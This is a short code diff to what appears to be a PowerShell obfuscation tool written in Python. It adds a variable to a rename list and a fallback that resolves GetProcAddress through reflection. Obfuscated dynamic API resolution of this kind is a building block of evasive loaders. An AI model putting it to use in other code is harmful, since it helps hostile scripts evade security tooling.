@@ -119,6 +119,7 @@ def obfuscate(script):
         "functionName",
         "hMod",
         "hRef",
+        "gpa",
         "assemblies",
         "delType",
         "assem",
@@ -156,6 +157,8 @@ def block_helpers():
     $tmp = @()
     $assem.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") { $tmp += $_ } }
     $hMod = ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName))
+    $gpa = $tmp | Where-Object { $_.GetParameters()[0].ParameterType -eq [IntPtr] } | Select-Object -First 1
+    if ($gpa) { return $gpa.Invoke($null, @($hMod, $functionName)) }
     $hRef = [System.Runtime.InteropServices.HandleRef]::new([System.Object]::new(), $hMod)
     return $tmp[0].Invoke($null, @($hRef, $functionName))
 }
